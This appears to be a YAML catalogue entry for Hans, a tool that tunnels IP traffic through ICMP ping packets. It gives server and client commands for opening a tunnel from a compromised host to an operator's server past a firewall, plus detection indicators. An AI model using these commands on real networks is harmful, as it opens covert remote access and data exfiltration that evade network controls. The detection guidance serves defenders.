---
Name: Hans
Description: Hans tunnels IPv4 traffic through ICMP echo request/reply packets (a "ping tunnel"). It is useful when outbound TCP/UDP is firewalled but ICMP ping is permitted, letting a compromised host reach an operator-controlled server over what looks like ordinary ping traffic.
Author: elhoim
Created: 2026-11-09
Commands:
  - Command: hans -s 192.168.99.1 -p <PASSWORD>
    Description: Starts the Hans server on the operator's host, creating a tun interface and assigning it the given IP.
    Usecase: Operator side of an ICMP tunnel.
    Category: access
    Privileges: Administrator/root
    OperatingSystem: Linux, MacOS, Windows

  - Command: hans -c <SERVER_IP> -p <PASSWORD>
    Description: Starts the Hans client, which creates a local tun interface and tunnels IP traffic to the server using ICMP echo packets.
    Usecase: Establishing an outbound tunnel from a compromised host when only ICMP is permitted outbound.
    Category: access
    Privileges: Administrator/root
    OperatingSystem: Linux, MacOS, Windows
Full_Path:
  - Filename: hans
  - Filename: hans.exe
  - Path: Downloaded/compiled hans binary, executed anywhere on the system.
Detection:
  - Command: Execution of hans with -c (client) or -s (server) and -p arguments.
  - Command: Creation of a tun/tap network interface by a process that is not a VPN client, together with a sustained high volume of ICMP echo request/reply traffic to a single destination.
Resources:
  - Link: https://github.com/friedrich/hans
---
